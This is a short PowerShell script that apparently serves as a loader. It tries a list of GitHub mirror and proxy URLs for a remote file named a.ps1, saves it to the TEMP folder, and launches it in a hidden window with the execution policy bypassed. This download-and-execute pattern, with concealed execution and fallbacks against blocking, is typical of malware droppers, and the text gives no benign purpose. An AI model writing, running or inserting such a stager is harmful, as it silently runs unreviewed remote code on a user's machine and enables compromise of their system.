$urls = @(
    "https://raw.githubusercontent.com/nhofx/a/sellaz/a.ps1",
    "https://ghproxy.net/https://raw.githubusercontent.com/nhofx/a/sellaz/a.ps1",
    "https://gh-proxy.com/https://raw.githubusercontent.com/nhofx/a/sellaz/a.ps1",
    "https://ghfast.top/https://raw.githubusercontent.com/nhofx/a/sellaz/a.ps1",
    "https://cdn.jsdelivr.net/gh/nhofx/a@sellaz/a.ps1",
    "https://raw.gitmirror.com/nhofx/a/sellaz/a.ps1"
)

$out = "$env:TEMP\a.ps1"
foreach ($u in $urls) {
    try {
        Invoke-WebRequest -Uri $u -OutFile $out -UseBasicParsing -ErrorAction Stop
        if ((Get-Item $out).Length -gt 0) { break }
    } catch {}
}

if (Test-Path $out) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$out`"" -WindowStyle Hidden
}